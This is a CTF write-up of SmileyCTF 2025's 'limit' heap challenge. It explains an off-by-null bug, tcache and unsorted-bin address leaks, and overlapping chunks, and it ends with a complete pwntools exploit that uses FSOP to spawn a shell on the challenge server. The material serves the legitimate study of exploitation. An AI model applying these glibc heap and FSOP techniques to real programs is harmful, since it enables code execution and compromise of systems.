# SmileyCTF 2025 Writeup (Pwn/Limit)

Over the weekend, I teamed up with friends to play [**SmileyCTF**](https://play.ctf.gg/), and the experience was fantastic.

The **pwn challenges** stood out — they were tough, rewarding, and helped sharpen my skills.

This writeup covers the `limit` challenge in detail.

Before diving deeper, let’s take a quick moment to understand the  **source code**  of the challenge.

## Source Code

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <malloc.h>

char* chunks[0x10] = {0};
uint16_t sizes[0x10] = {0};

int main() {
    uint64_t idx;
    uint64_t sz;
    char* limit;
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    free(malloc(0x418));
    limit = (char*) sbrk(0);
    puts("hi");
    while (1) {
        puts("Options:");
        puts("1) malloc up to 0x100 bytes");
        puts("2) free chunks and clear ptr");
        puts("3) print chunks using puts");
        puts("4) read to chunks with max possible size");
        printf("> ");
        uint option;
        if (!scanf("%d", &option)) {
            getchar();
        }
        switch (option) {
            case 1:
                printf("Index: ");
                if (!scanf("%ld", &idx) || idx >= 0x10) {
                    puts("idx < 0x10");
                    break;
                }
                printf("Size: ");
                if (!scanf("%ld", &sz) || !sz || sz > 0xf8) {
                    puts("0 < sz <= 0xf8");
                    break;
                }
                chunks[idx] = malloc(sz);
                if (chunks[idx] > limit) {
                    puts("hey where do you think ur going");
                    // if (malloc_usable_size(chunks[idx])) free(chunks[idx])
                    chunks[idx] = 0;
                    break;
                }
                uint16_t usable_size = sz > 0x18 ? (sz+7&~0xf)+8 : 0x18;
                sizes[idx] = usable_size;
                break;
            case 2:
                printf("Index: ");
                if (!scanf("%ld", &idx) || idx >= 0x10) {
                    puts("idx < 0x10");
                    break;
                }
                if (chunks[idx] == 0) {
                    puts("no chunk at this idx");
                    break;
                }

                free(chunks[idx]);
                chunks[idx] = 0;
                sizes[idx] = 0;
                break;
            case 3:
                printf("Index: ");
                if (!scanf("%ld", &idx) || idx >= 0x10) {
                    puts("idx < 0x10");
                    break;
                }
                if (!chunks[idx]) {
                    puts("no chunk at this idx");
                    break;
                }
                printf("Data: ");
                puts(chunks[idx]);
                break;
            case 4:
                printf("Index: ");
                if (!scanf("%ld", &idx) || idx >= 0x10) {
                    puts("idx < 0x10");
                    break;
                }
                if (!chunks[idx]) {
                    puts("no chunk at this idx");
                    break;
                }
                printf("Data: ");
                int len = read(0, chunks[idx], (uint) sizes[idx]);
                if (len <= 0) {
                    puts("read failed");
                    break;
                }
                chunks[idx][len] = 0;
                break;
            default:
                puts("invalid option");
                break;
        }
        puts("");
    }
    _exit(0);
}

```

> *Ah, I get a wave of nostalgia every time I see note-maker-style heap challenges. But hold on—this one's not your typical heap playground. There's a sneaky twist waiting beneath the surface.*
> 

Lets understand the code piece by piece 

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <malloc.h>

char* chunks[0x10] = {0};
uint16_t sizes[0x10] = {0};

int main() {
    uint64_t idx;
    uint64_t sz;
    char* limit;
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    free(malloc(0x418));
    limit = (char*) sbrk(0);
    puts("hi");
    // While loop code
```

The program begins by defining two global arrays:

- `chunks[0x10]`: an array of 16 pointers to heap-allocated memory chunks.
- `sizes[0x10]`: an array of 16 `uint16_t` elements storing the size of each corresponding chunk.
Notably, each size entry is a 2-byte value (`uint16_t`), meaning the program can store chunk sizes up to `0xffff` (65535 bytes).

This kind of setup is typical in heap exploitation challenges, where allocated heap chunks are stored in a global `chunks` array, and their corresponding sizes are tracked in a separate `sizes` array.

### Now, In  main Function

Two local variables are declared: `idx` and `sz`.

- `idx` will likely be used as an index into the `chunks` and `sizes` arrays.
- `sz` presumably stores the size for a new allocation.

The `setvbuf` calls disable I/O buffering to ensure immediate input/output, it’s a common practice in CTF challenges.

Then, the program performs a `malloc(0x418)` and immediately frees the resulting chunk. 

Next, the program sets the `limit` pointer using `sbrk(0)`. This syscall returns the current program break — i.e., the end of the heap segment.

<aside>
💡

The `sbrk(0)` syscall returns the current **program break**, which is the end of the process’s **heap segment**. ( here it will return the heap address immediately at the end of the freed chunk )

</aside>

I wonder how it may be used in further code , but i am not getting good vibes for this limit stuff.

<img src="/d1ff/images_limit/9yg62s.jpg" width="400" style="display: block; margin: auto;"  />
<!-- ![9yg62s.jpg](/d1ff/images_limit/9yg62s.jpg) -->


### Case 1: Malloc up to 0x100 bytes

```c
while (1) {
        puts("Options:");
        puts("1) malloc up to 0x100 bytes");
        puts("2) free chunks and clear ptr");
        puts("3) print chunks using puts");
        puts("4) read to chunks with max possible size");
        printf("> ");
        uint option;
        if (!scanf("%d", &option)) {
            getchar();
        }
        switch (option) {
            case 1:
                printf("Index: ");
                if (!scanf("%ld", &idx) || idx >= 0x10) {
                    puts("idx < 0x10");
                    break;
                }
                printf("Size: ");
                if (!scanf("%ld", &sz) || !sz || sz > 0xf8) {
                    puts("0 < sz <= 0xf8");
                    break;
                }
                chunks[idx] = malloc(sz);
                if (chunks[idx] > limit) {
                    puts("hey where do you think ur going");
                    chunks[idx] = 0;
                    break;
                }
                uint16_t usable_size = sz > 0x18 ? (sz+7&~0xf)+8 : 0x18;
                sizes[idx] = usable_size;
                break;
            //further cases
  //The initial four lines simply print out the menu with the available options.          
```

> First, it checks whether the index where you want to store your chunk's address lies within the bounds of the `chunks` table.
> 

> If that passes, it then checks the size — it must be positive and less than or equal to `0xf8`.
> 

> Now here comes the twist: it **allocates** the chunk **before** checking if the allocated pointer lies beyond a certain `limit`. If the pointer *is* beyond `limit`, it immediately nulls out the chunk at that index in the `chunks` table.
> 

🥲 *This is kind of a disaster for us, because you’re basically forced to stay within a specific memory region — you can’t go wild across other memory regions after this limit.*

<aside>
💡

But,  there’s something suspicious here. 

The **order** of operations is the key — the program allocates memory *first*, then checks if it’s valid. This might seem trivial, but it's exactly the kind of detail that can turn out to be gold for exploitation later.

</aside>

---

### Case 2: Free chunks and clear ptr

```c
case 2:
    printf("Index: ");
    if (!scanf("%ld", &idx) || idx >= 0x10) {
        puts("idx < 0x10");
        break;
    }
    if (chunks[idx] == 0) {
        puts("no chunk at this idx");
        break;
    }

    free(chunks[idx]);
    chunks[idx] = 0;
    sizes[idx] = 0;
    break;
```

> It’s simple — first, it again verifies whether the index is within bounds.
> 

> If the index check passes, it then checks if there’s actually a pointer at that index. If there’s none, it just breaks out with a message.
> 

> Otherwise, it frees the chunk at that index, then nulls out the pointer in the `chunks` table, and also sets the corresponding size to `0`.
> 

---

### Case 3: print chunks using puts

```c
case 3:
    printf("Index: ");
    if (!scanf("%ld", &idx) || idx >= 0x10) {
        puts("idx < 0x10");
        break;
    }
    if (!chunks[idx]) {
        puts("no chunk at this idx");
        break;
    }
    printf("Data: ");
    puts(chunks[idx]);
    break;
```

> Simple — it prints the data at the specified chunk.
> 

> First, it checks if the index is within bounds, and then ensures there's actually a address present at that index.
> 

> If everything’s good, it uses `puts` to print the contents of the chunk.
> 

<aside>
💡

This is **very** useful — it can potentially be abused to **leak addresses** . Classic info leak opportunity 😈.

</aside>

---

### Case 4: Read to chunks with max possible size

```c
					 case 4:
                printf("Index: ");
                if (!scanf("%ld", &idx) || idx >= 0x10) {
                    puts("idx < 0x10");
                    break;
                }
                if (!chunks[idx]) {
                    puts("no chunk at this idx");
                    break;
                }
                printf("Data: ");
                int len = read(0, chunks[idx], (uint) sizes[idx]);
                if (len <= 0) {
                    puts("read failed");
                    break;
                }
                chunks[idx][len] = 0;
                break;
            default:
                puts("invalid option");
                break;
        }
        puts("");
    }
    _exit(0);
}

```

> Performs regular checks then, it reads input from `stdin` into the chunk at that index, up to the size stored in the `sizes` table for that chunk.
> 

> Then — the part to pay attention to — it sets the **next immediate byte after the read** to `0`, to null-terminate the string.
> 

<img src="/d1ff/images_limit/bad_code.png" width="400" style="display: block; margin: auto;"  />
<!-- ![bad_code.png](/d1ff/images_limit/bad_code.png) -->

This introduces a **potential null byte poisoning.**

<aside>
💡

Why? Suppose you fill the chunk *exactly* up to its max size — then the null byte written at `chunks[idx][len] = 0` will end up right **after** the allocated chunk.

</aside>

*But how will this help in our exploit? We'll get to that soon — just store this info  in your shrinking hippocampus for now.*

---

## Additional challenge info

`Binary Protections`:

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

`libc version` → 2.39 

---

## LEAK, LEAK , LEAK all that I want !

getting heap and Libc leak is quite straight forward here , 

To get the **heap leak**, we allocate two chunks of the same size (small enough to fit in the tcache bin), then free both of them. Now, when we allocate again with the same size, we get back one of the previously freed chunks.
Now, when we print the content of this freshly reallocated chunk, we see a pointer left behind by the allocator — yupp**! `heap leak`.**

<aside>
💡

Why does this happen? Because `malloc` is lazy — it doesn't bother clearing out the contents of the chunk before handing it back to you. Combine this with how **tcache bins** work (specifically, storing forward pointers inside freed chunks), to better understand how tcache works, look here → 

</aside>

*(We need to Deobfuscate the heap leak because of the [safe linking](https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking) implementation in tcache)*

```python
from pwn import *

elf = ELF("./limit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
global r
# r = process()
r = remote('smiley.cat', '39321')
def defuscate(x,l=64):
    p = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (p & (0xf << i+12 )) >> i+12
        p |= (v1 ^ v2) << i
    return p

def obfuscate(p, adr):
    return p^(adr>>12)

def create(index,size):
    r.sendlineafter(b'> ',b'1')
    r.sendlineafter(b'Index:',str(index).encode())
    r.sendlineafter(b'Size:',str(size).encode())

def free(index):
    r.sendlineafter(b'> ',b'2')   
    r.sendlineafter(b'Index:',str(index).encode())

def view(index):
    r.sendlineafter(b'> ',b'3')   
    r.sendlineafter(b'Index:',str(index).encode())

def write_into(index,content):
    r.sendlineafter(b'> ',b'4')   
    r.sendlineafter(b'Index:',str(index).encode())
    r.sendafter(b'Data: ',content)

# gdb.attach(r,gdbscript='b *main+1273')
create(0,24)
create(1,24)
free(0)
free(1)
create(0,24)
view(0)
r.recvuntil(b'Data: ')
heap_base = defuscate(unpack(r.recv(6),'all')) + 0x562c4dace000 -0x562c4dace2a0
log.critical(f'heap_base = {hex(heap_base)}')
```

Obtaining the **Libc leak** is straightforward: free a chunk  into the unsorted bin, allocate a chunk of the from the unsorted freed memory , and then print it’s content — you get, `Libc leak` in return !

<aside>
💡

Why ? Well, when a chunk gets placed in the unsorted bin, glibc stashes forward and backward pointers (`fd` and `bk`) inside it, pointing into libc’s main arena. And again, malloc doesn’t zero anything out when reusing the chunk.

</aside>

```python
for i in range(8):
    create(i,0xf8)
for i in range(7,-1,-1):
    free(i)  
#chuck at 0 index is in Unsorted bin and other chunks are inside tcache bin
create(0,32) 
view(0)
r.recvuntil(b'Data: ')
libc.address = unpack(r.recv(6),'all') + 0x726908600000 - 0x726908803c10
log.critical(f'libc.address = {hex(libc.address)}')
```

---

## Can We Pwn It Now?

<p float="left">
  <img src="/d1ff/images_limit/a3233e72-527b-4382-be14-7a3c8f08fdf1.png" width="300"/>
  <img src="/d1ff/images_limit/66b399b8-651b-4ed0-a8a0-a2a3505de317.png" width="300"/>
</p>
<!-- ![pwnit2.png](/d1ff/images_limit/a3233e72-527b-4382-be14-7a3c8f08fdf1.png) -->

<!-- ![pwnit2.png](/d1ff/images_limit/66b399b8-651b-4ed0-a8a0-a2a3505de317.png) --> 

Not quite — at least, **not yet**. The reason lies in the **`limit`** condition: we’re restricted from writing to any memory **above** the `limit` pointer. However, anything **below** it is fair game.

To understand our options, let’s take a look at the **virtual memory layout**:

![image.png](/d1ff/images_limit/image.png)

As shown above, the entire ELF binary — including its `.data` section — resides at a **lower address** than the heap. That means the `.data` section is within our writable range, and that’s a big opportunity.

<aside>
💡

But how does that help? 

Well, imagine if we could allocate a chunk **on the `chunks` pointer array itself** in the `.data` section. Then, we could write arbitrary pointers into the `chunks` table. Since reading and writing from/into a chunk only requires a valid pointer at that index, we’d gain the ability to arbitrary read and write at any location.

</aside>

However, there's a catch: to pull this off, we need the **`ELF base address`** too.

But before diving into ELF leaks,  let us understand how to utilize the **`null byte overflow`** bug.

---

## Null Byte Poisoning

A **single null byte overflow** on the heap might seem small, but — it holds the power to give us an **overlapping chunk.** 
With overlapping chunks, we can exploit a classic vulnerability: **Use-After-Free (UAF)**.

For this part, I’ve mostly followed a well-known proof of concept by **Shellphish** (the legends themselves) →   https://github.com/shellphish/how2heap/blob/master/glibc_2.35/poison_null_byte.c

*If you're not in the mood to dig into the inner workings of the null byte overflow, that's alright — feel free to move on. Just know that it effectively provides us UAF on a freed chunk.*

### [Chunk Metadata](https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/malloc/malloc.c#L1128)

![Chunk metadata by Azeria Labs ](/d1ff/images_limit/chunk-allocated-CS.png)

Chunk metadata by Azeria Labs 

Now, The important part  for null byte poisoning are :- 

- **`prev_inuse` Bit** → This flag, stored in the least significant bit of a chunk's size field, indicates whether the **previous chunk is in use**. It is set to `1` for allocated chunks, tcache, and fastbin-freed chunks, and set to `0` when the previous chunk is in the **unsorted or large bin** (i.e., truly freed). This bit helps the heap manager decide whether it can **coalesce** adjacent free chunks.
- **`prev_size` Field** → When the `prev_inuse` bit is `0` (i.e., the previous chunk is freed), this field stores the **size of the previous free chunk**. It’s used during coalescing to correctly locate and merge neighboring chunks.

### [How coalescing is performed?](https://elixir.bootlin.com/glibc/glibc-2.3/source/malloc/malloc.c#L4102)

Whenever a chunk is freed into the **unsorted bin** or any **coalescing bin**, the heap manager first checks the **`prev_inuse`** bit to see if the **previous chunk is also free**.

If so, it will **coalesce** (i.e., merge) the two chunks into a **single larger free chunk**, optimizing memory and reducing fragmentation.

lets see it in visuals

![finalnull.gif](/d1ff/images_limit/finalnull.gif)

**Getting Overlapping Chunk**

Now, using an **off-by-null** overflow, we can **clear the `prev_inuse` bit** of the next chunk without actually freeing the previous one. This tricks the heap into thinking that the previous chunk is free — even though it’s still allocated.

So, when we later **free the next (adjacent) chunk**, the heap checks the `prev_inuse` bit, sees it as `0`, and **attempts to coalesce** it with the "previous" chunk — which we never actually freed. As a result, the allocator merges them into one large chunk.

Now, if we free the **real middle chunk**, and then allocate a new chunk that fits the entire merged region, it will overlap with the recently free middle chunk. **Hence, Providing `UAF` on it.**

image

**Note:** The explanation above provides a **high-level overview** of the **Null Byte Poisoning** technique. When crafting a full exploit, you'll need to carefully account for all the **heap integrity checks** performed during `free()`, as well as perform some strategic [**heap feng shui**](https://en.wikipedia.org/wiki/Heap_feng_shui) to align your chunks just right and achieve the desired overlap.

*For a deeper understanding of the exploit’s implementation, **Shellphish** and others have provided excellent POC and write-ups  — check them out in the **Resources** section at the end!*

```python
target = obfuscate(heap_base+0x100,heap_base)
create(8,0x38)  #### a
offset = 0xca0
address = heap_base + offset
write_into(8,pack(0)+pack(0x60)+pack(address)+pack(address))

create(9,0x28) #### b
create(10,0xf8) #### c
create(11,24)  ################## seperate from top_chunk

write_into(9,b'\x00'*(0x28-8)+pack(0x60))

for i in range(7,0,-1):
    free(i)
    
free(10) 

create(12,0xd8)
create(13,0x28)
free(13)
free(9)

write_into(12,pack(0)*5+pack(0x31)+pack(target)[:7])

create(13,0x28)
```

---

## Getting ELF Leak

*The caffeine from my coffee had long worn off, and frustration started to kick in as I kept hitting a wall trying to figure out how to get the `ELF leak`. So, I called it a night and went to bed.*

*But my subconcious brain wasn’t done yet.*

<img src="/d1ff/images_limit/sleepingbrain.png" width="300" style="display: block; margin: auto;"  />
<!-- ![sleepingbrain.png](/d1ff/images_limit/sleepingbrain.png) -->

We still don’t have the **ELF base address**, which means we **`can’t yet allocate` a chunk over the `.data` section** — and with the `limit` still enforcing boundaries, we’re restricted to playing within the **heap region** only.

But it’s time for a little **act of chicanery**. By carefully leveraging some behavior of `malloc` along with the bug we encountered in [**Case 1**](https://anony6174.github.io/d1ff/posts/smiley_writeup/limit/#case-1-malloc-up-to-0x100-bytes), we’re about to **trick our way to an ELF leak.**

### 📦 Tcache Bins

**Tcache**, short for **Thread-Local Caching**, was introduced in **glibc 2.26+** to make memory allocation and deallocation way faster and smoother.

Before tcache, freed chunks would go directly into `fastbins, small bins, or unsorted bins,` which are shared across threads. This caused **lock contention** and reduced performance in multi-threaded applications.

With tcache, each thread has its own private cache of freed chunks, making allocation and deallocation faster and lock-free (*most of the time).

**Tcache bins** are **arrays of singly-linked lists**, where each bin holds freed chunks of a specific size class.

Each bin can store **up to 7 chunks** (by default) of a particular size.

When you `free()` a chunk that fits in tcache:

- If the corresponding bin is not full, the chunk is added to the front of the list.
- If it *is* full, it falls back to fastbin or other bins.

Now, every chunk that gets freed into **tcache** carries a **forward pointer (`fd`)** that points to the **next available chunk** in the same size class. The **tcache bin** for that size keeps track of the **most recently freed chunk** — basically the head of the linked list.

![tcache-Pica.png](/d1ff/images_limit/tcache-Pica.png)

So, when you `malloc(sz)`, the allocator first checks the tcache bin for size `sz`. If a chunk is available, it simply pops it off the list and returns it. The `fd` of that chunk (i.e., the next chunk in line) becomes the new head of the bin. 


### Leaking Elf Address

The **tcache bin array** resides within the **thread-local [`tcache_perthread_struct`](https://elixir.bootlin.com/glibc/glibc-2.39.9000/source/malloc/malloc.c#L3118)**, which is usually located at the **start of the heap** for the main thread. It contains multiple bins (one for each size class), and each bin holds a singly-linked list of freed chunks of a specific size.

```c
# define TCACHE_FILL_COUNT 7
# define TCACHE_MAX_BINS 64

/////////////////////// STRUCTURE //////////////////////////////
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread bool tcache_shutting_down = false;
static __thread tcache_perthread_struct *tcache = NULL;

////////////////////////// OPERATION //////////////////////////

 /* Caller must ensure that we know tc_idx is valid and there's room
    for more chunks.  */
 static void
 tcache_put (mchunkptr chunk, size_t tc_idx)
 {
   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
   assert (tc_idx < TCACHE_MAX_BINS);
   e->next = tcache->entries[tc_idx];
   tcache->entries[tc_idx] = e;
   ++(tcache->counts[tc_idx]);
 }
 
 /* Caller must ensure that we know tc_idx is valid and there's
    available chunks to remove.  */
 static void *
 tcache_get (size_t tc_idx)
 {
   tcache_entry *e = tcache->entries[tc_idx];
   assert (tc_idx < TCACHE_MAX_BINS);
   assert (tcache->entries[tc_idx] > 0);
   tcache->entries[tc_idx] = e->next;
   --(tcache->counts[tc_idx]);
   return (void *) e;
 }
 
 /*  *Recent versions of libc have introduced several new mechanisms and security
  checks related to tcache management, which are not shown above for the sake of 
  simplicity.*   */
```

Now here’s the trick: if you manage to **allocate a chunk over the tcache bin array itself** — which lives in the `.data` section of the heap — you gain the ability to **control the head of the linked list** for any size class. This means you can essentially dictate **what pointer malloc will return next** when that size is requested.

However, we face a constraint — we can’t read from or write to memory **beyond the `limit` pointer**, but we **can still allocate chunks** there. This is important: although we can't directly interact with memory past `limit`, we can still influence allocator behavior by setting things up just right.

Now, here’s where it gets fun.

When you allocate a chunk of a certain size and the corresponding **tcache bin** has **at least two chunks**, malloc:

1. Pops the **head** of the bin,
2. Updates the bin’s head to the value stored in the `fd` field of the freed chunk (which is located just after the size field in the chunk metadata).

<img src="/d1ff/images_limit/tcache_bins.gif" width="700" style="display: block; margin: auto;"  />

So if that `fd` field (the forward pointer) lies in memory **past the `limit`**, we can’t inspect it directly — but **malloc will still read it and update the bin head**, trusting the value that’s stored there. And then we simply **print the content** of the chunk (one which is allocated on tcache_bin itself)!

We exploit this behavior to leak a **stack address**, which we know can often be found in the **libc data section**. (I looked through the data section and didn't find any ELF pointers directly, but I did find **stack pointers**.)

*Here’s the catch: in modern glibc versions, **tcache pointers are obfuscated** for security. The `fd` pointer is XOR’d with a per-process secret when stored. So when glibc wants to update the bin head, it **de-obfuscates** the value using this secret before using it.*

Now, when we **sneak in a raw stack pointer** (i.e., un-obfuscated) into the chunk's `fd`, glibc tries to **de-obfuscate it anyway**, thinking it’s legit tcache data. This gives us a **corrupted value**, but since we control the inputs, we can **reverse this de-obfuscation manually** to recover the **original stack pointer**.

Once we’ve got a valid **stack leak**, it becomes trivial to locate a return address or saved register on the stack that points back into the **ELF binary** — allowing us to **leak the ELF base address**.

```python
 ######### leaking stack and elf address ##########
 
libc_argv = libc.address + 0x2046e0
stack_offset = 0x7ffe1ebbf2a8- 0x7ffe1ebbf258-8
print("libc_argv = ",hex(libc_argv))
create(14,0x28)
write_into(14,pack(libc_argv))
create(0,0xf8)
view(14)
r.recvuntil(b'Data: ')
temp = unpack(r.recv(6),'all')
stack_leak  = obfuscate(temp,libc_argv)
log.critical(f'stack_leak = {hex(stack_leak)}')

write_into(14,pack(stack_leak-stack_offset))
create(0,0xf8)
view(14)

r.recvuntil(b'Data: ')
temp = unpack(r.recv(6),'all')
elf.address  = obfuscate(temp,stack_leak) + 0x60ea2433c000 - 0x60ea2433d160
log.critical(f'elf.address = {hex(elf.address)}')
```

---

## Final Blow

Now we have everything we need — all the leaks and one of the most powerful exploitation primitives in hand: **arbitrary read and write**.

*At this point, getting shell access is just a matter of time.*

<img src="/d1ff/images_limit/blow.gif" width="300" style="display: block; margin: auto;"  />
<!-- ![blow.gif](/d1ff/images_limit/blow.gif) -->

There are tons of solid techniques you can pull off from here, especially with **arb read/write** on **last libc versions**. One particularly **awesome list** of such methods is this [document by nobodyisnobody](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md) — definitely worth a read.

As for me, I went with a classic: **FSOP (File Stream Oriented Programming)** via a corrupted `stdout` structure and a call to `puts()`. Clean and effective. 🔪

### Exploitation Script

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./limit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
global r
# r = process()
r = remote('smiley.cat', '39321')
def defuscate(x,l=64):
    p = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (p & (0xf << i+12 )) >> i+12
        p |= (v1 ^ v2) << i
    return p

def obfuscate(p, adr):
    return p^(adr>>12)

def create(index,size):
    r.sendlineafter(b'> ',b'1')
    r.sendlineafter(b'Index:',str(index).encode())
    r.sendlineafter(b'Size:',str(size).encode())

def free(index):
    r.sendlineafter(b'> ',b'2')   
    r.sendlineafter(b'Index:',str(index).encode())

def view(index):
    r.sendlineafter(b'> ',b'3')   
    r.sendlineafter(b'Index:',str(index).encode())

def write_into(index,content):
    r.sendlineafter(b'> ',b'4')   
    r.sendlineafter(b'Index:',str(index).encode())
    r.sendafter(b'Data: ',content)

# gdb.attach(r,gdbscript='b *main+1273')
create(0,24)
create(1,24)
free(0)
free(1)
create(0,24)
view(0)
r.recvuntil(b'Data: ')
heap_base = defuscate(unpack(r.recv(6),'all')) + 0x562c4dace000 -0x562c4dace2a0
log.critical(f'heap_base = {hex(heap_base)}')
free(0)
create(0,24)
for i in range(8):
    create(i,0xf8)
for i in range(7,-1,-1):
    free(i)

create(0,32)
view(0)
r.recvuntil(b'Data: ')
libc.address = unpack(r.recv(6),'all') + 0x726908600000 - 0x726908803c10
log.critical(f'libc.address = {hex(libc.address)}')
create(0,0xf8-32)
for i in range(1,8):
    create(i,0xf8)
create(0,24)
create(0,0xd0-8)  
create(0,0x100-0x30)  

######################################### off-by-one #############################################

target = obfuscate(heap_base+0x100,heap_base)
create(8,0x38)  #### a
offset = 0xca0
address = heap_base + offset
write_into(8,pack(0)+pack(0x60)+pack(address)+pack(address))

create(9,0x28) #### b
create(10,0xf8) #### c
create(11,24)  ################## seperate from top_chunk

write_into(9,b'\x00'*(0x28-8)+pack(0x60))

for i in range(7,0,-1):
    free(i)

free(10) 

create(12,0xd8)
create(13,0x28)
free(13)
free(9)

write_into(12,pack(0)*5+pack(0x31)+pack(target)[:7])

create(13,0x28)

# create(14,0x28)
# view(14)

####################################################################################33
              ######### leaking stack and elf address ##########
libc_argv = libc.address + 0x2046e0
stack_offset = 0x7ffe1ebbf2a8- 0x7ffe1ebbf258-8
print("libc_argv = ",hex(libc_argv))
create(14,0x28)
write_into(14,pack(libc_argv))
create(0,0xf8)
view(14)
r.recvuntil(b'Data: ')
temp = unpack(r.recv(6),'all')
stack_leak  = obfuscate(temp,libc_argv)
log.critical(f'stack_leak = {hex(stack_leak)}')

write_into(14,pack(stack_leak-stack_offset))
create(0,0xf8)
view(14)

r.recvuntil(b'Data: ')
temp = unpack(r.recv(6),'all')
elf.address  = obfuscate(temp,stack_leak) + 0x60ea2433c000 - 0x60ea2433d160
log.critical(f'elf.address = {hex(elf.address)}')

write_into(14,pack(elf.sym.chunks+0x10))
create(2,0xf8)
write_into(2,pack(elf.sym.chunks+0x10)+pack(libc.sym['_IO_2_1_stdout_'])+pack(0)*(16-4)+p16(0x1f0)*16)
#######################################################################################3#3
                           ######### Performing FSOP ###########
stdout_lock = libc.sym['_IO_2_1_stdout_'] + 0x250	# _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
gadget = libc.address + 0x00000000001724f0 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = libc.sym.system
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')	# will be at rdi+0x10
fake._lock = stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout_lock+0x18
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
payload = bytes(fake)
#############################################################################################
write_into(3,payload[:0x1e0])

r.interactive()
```

`For FSOP` → https://pwn.college/software-exploitation/file-struct-exploits/, https://blog.kylebot.net/2022/10/22/angry-FSROP/, https://chovid99.github.io/posts/stack-the-flags-ctf-2022/.

---

## **.;,;.** Summary

- In this challenge, we tackled a heap-based binary with a `chunks` table and size tracking. Using **tcache mechanics and view functionality**, we easily leaked **heap** and **libc** addresses.

- However, a `limit` pointer blocked writes to memory above a certain point. 

- While reading data into a chunk, we identified a **null byte poisoning** bug, **which we used** to create **overlapping chunks**, enabling a **Use-After-Free (UAF)** primitive.

- We then exploited **tcache bin behavior**, especially how malloc updates the bin head using the chunk's `fd` pointer. This allowed us to **indirectly leak a stack address** from libc’s `.data` section. By reversing the pointer obfuscation, we recovered a valid stack pointer and used it to leak an **ELF address**.

- With **arbitrary read/write**, and full leaks of **heap, libc, stack, and ELF**, we weaponized **FSOP (File Stream Oriented Programming)** by crafting a fake `stdout` structure and triggering code execution via `puts()`.

![flag2.png](/d1ff/images_limit/b1c8c5c0-5933-4591-bffe-15c5aabdb983.png)

---

## Resources and References

 😊`smiley’s` → https://play.ctf.gg/, https://ctf.gg/

- `challenge files` → https://github.com/sajjadium/ctf-archives/tree/main/ctfs/smileyCTF/2025
- `Safe-linking` → https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking
- https://azeria-labs.com/
- https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md
- https://github.com/shellphish/how2heap
- https://blog.quarkslab.com/heap-exploitation-glibc-internals-and-nifty-tricks.html
- https://pwn.college/
- https://phrack.org/issues/66/10
- https://7rocky.github.io/en/ctf/htb-challenges/pwn/bon-nie-appetit/ ( `similar writeup` )
- https://hackmd.io/@5Mo2wp7RQdCOYcqKeHl2mw/ByTHN47jf

---

> Author: [_d1ff](https://discord.com/users/1157208253055381504)  
> URL: http://localhost:1313/d1ff/posts/smiley_writeup/limit/  

